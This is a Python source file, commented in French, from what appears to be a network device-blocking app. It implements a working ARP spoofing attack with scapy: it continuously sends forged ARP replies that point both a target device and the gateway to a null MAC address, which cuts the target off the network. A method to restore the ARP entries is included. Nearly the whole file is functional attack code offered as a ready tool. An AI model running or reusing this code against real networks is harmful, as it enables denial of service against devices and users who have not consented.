import threading

import time



from app.blockers.base import BaseBlocker

from app.core.network_utils import get_default_gateway

from app.models.device import BlockMethod



_active_threads: dict[str, threading.Thread] = {}

_stop_flags: dict[str, threading.Event] = {}

_ready_flags: dict[str, threading.Event] = {}

_errors: dict[str, str] = {}



# MAC invalide — la cible ne peut plus joindre la passerelle

BLACKHOLE_MAC = "00:00:00:00:00:00"





def _key(ip: str, mac: str) -> str:

    return f"{ip}:{mac}"





class ArpSpoofBlocker(BaseBlocker):

    """

    Coupure réseau via ARP spoofing bidirectionnel.

    Empoisonne la table ARP de la cible ET de la passerelle pour

    couper réellement l'accès Internet/LAN de l'appareil visé.

    """



    method = BlockMethod.ARP_SPOOF

    label = "Coupure réseau (ARP)"

    description = (

        "Empoisonne les tables ARP de la cible et de la box/routeur pour "

        "couper fortement sa connexion. Méthode la plus efficace sur un LAN. "

        "Nécessite les droits administrateur et Npcap/WinPcap."

    )

    requires_admin = True



    def _run_spoof(

        self,

        ip: str,

        mac: str,

        stop_event: threading.Event,

        ready_event: threading.Event,

    ) -> None:

        key = _key(ip, mac)

        try:

            from scapy.all import ARP, Ether, getmacbyip, sendp  # type: ignore[import-untyped]

            from scapy.config import conf  # type: ignore[import-untyped]



            conf.verb = 0



            gateway_ip = get_default_gateway()

            if not gateway_ip:

                raise RuntimeError("Passerelle introuvable (route print).")



            target_mac = mac.upper().replace("-", ":")

            gateway_mac = getmacbyip(gateway_ip)

            if not gateway_mac:

                raise RuntimeError(

                    f"Impossible de résoudre la MAC de la passerelle ({gateway_ip}). "

                    "Relancez un scan réseau."

                )



            iface = conf.iface

            ready_event.set()



            while not stop_event.is_set():

                # Dire à la cible : la box est à une MAC morte

                poison_target = Ether(dst=target_mac) / ARP(

                    op=2,

                    hwsrc=BLACKHOLE_MAC,

                    psrc=gateway_ip,

                    hwdst=target_mac,

                    pdst=ip,

                )

                # Dire à la box : la cible est à une MAC morte

                poison_gateway = Ether(dst=gateway_mac) / ARP(

                    op=2,

                    hwsrc=BLACKHOLE_MAC,

                    psrc=ip,

                    hwdst=gateway_mac,

                    pdst=gateway_ip,

                )

                sendp(poison_target, iface=iface, verbose=0)

                sendp(poison_gateway, iface=iface, verbose=0)

                stop_event.wait(0.5)



        except ImportError:

            _errors[key] = "Scapy/Npcap manquant. Installez scapy + Npcap (npcap.com)."

        except Exception as exc:

            _errors[key] = str(exc)

        finally:

            ready_event.set()



    def block(self, ip: str, mac: str) -> None:

        key = _key(ip, mac)

        if key in _active_threads and _active_threads[key].is_alive():

            return



        stop_event = threading.Event()

        ready_event = threading.Event()

        _stop_flags[key] = stop_event

        _ready_flags[key] = ready_event

        _errors.pop(key, None)



        thread = threading.Thread(

            target=self._run_spoof,

            args=(ip, mac, stop_event, ready_event),

            daemon=True,

        )

        _active_threads[key] = thread

        thread.start()



        if not ready_event.wait(timeout=5):

            stop_event.set()

            thread.join(timeout=2)

            raise RuntimeError(

                "ARP spoofing n'a pas démarré à temps. Lancez en administrateur avec Npcap."

            )



        if key in _errors:

            err = _errors.pop(key)

            stop_event.set()

            thread.join(timeout=2)

            raise RuntimeError(err)



        if not thread.is_alive():

            err = _errors.pop(key, "Le thread ARP s'est arrêté immédiatement.")

            raise RuntimeError(err)



    def unblock(self, ip: str, mac: str) -> None:

        key = _key(ip, mac)

        if key in _stop_flags:

            _stop_flags[key].set()

        if key in _active_threads:

            _active_threads[key].join(timeout=5)

            del _active_threads[key]

        _stop_flags.pop(key, None)

        _ready_flags.pop(key, None)

        _errors.pop(key, None)



        # Restaurer les entrées ARP correctes

        try:

            from scapy.all import ARP, Ether, getmacbyip, sendp  # type: ignore[import-untyped]

            from scapy.config import conf  # type: ignore[import-untyped]



            gateway_ip = get_default_gateway()

            if not gateway_ip:

                return



            target_mac = mac.upper().replace("-", ":")

            gateway_mac = getmacbyip(gateway_ip)

            if not gateway_mac:

                return



            restore_target = Ether(dst=target_mac) / ARP(

                op=2,

                hwsrc=gateway_mac,

                psrc=gateway_ip,

                hwdst=target_mac,

                pdst=ip,

            )

            restore_gateway = Ether(dst=gateway_mac) / ARP(

                op=2,

                hwsrc=target_mac,

                psrc=ip,

                hwdst=gateway_mac,

                pdst=gateway_ip,

            )

            for _ in range(3):

                sendp(restore_target, iface=conf.iface, verbose=0)

                sendp(restore_gateway, iface=conf.iface, verbose=0)

                time.sleep(0.2)

        except ImportError:

            pass



    def is_active(self, ip: str, mac: str) -> bool:

        key = _key(ip, mac)

        return key in _active_threads and _active_threads[key].is_alive()


